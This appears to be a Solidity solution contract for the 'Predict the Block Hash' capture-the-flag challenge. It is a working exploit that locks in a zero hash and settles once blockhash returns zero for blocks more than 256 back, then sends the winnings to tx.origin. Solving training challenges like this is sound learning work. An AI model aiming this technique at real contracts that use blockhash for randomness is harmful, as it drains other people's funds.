pragma solidity ^0.7.4;

// import "hardhat/console.sol";


interface IPredictTheBlockHashChallenge {
    function isComplete() external view returns (bool);
    function lockInGuess(bytes32 hash) external payable;
    function settle() external; 
}

contract PredictTheBlockHashProxy {
    function guess(address _targetAddr) external payable {
        require(msg.value == 1 ether);

        IPredictTheBlockHashChallenge target = IPredictTheBlockHashChallenge(_targetAddr);
        target.lockInGuess{value: 1 ether}(0x0000000000000000000000000000000000000000000000000000000000000000);
    }

    function attack(address _targetAddr, uint256 blocknum) external payable {
        IPredictTheBlockHashChallenge target = IPredictTheBlockHashChallenge(_targetAddr);

        bytes32 answer = blockhash(blocknum);
        bytes32 settledAnswer = 0x0000000000000000000000000000000000000000000000000000000000000000;
        // console.log(answer);

        require(answer == settledAnswer, "wait for more blocks");
        target.settle();

        tx.origin.transfer(address(this).balance);
    }
    
    receive() external payable {}
}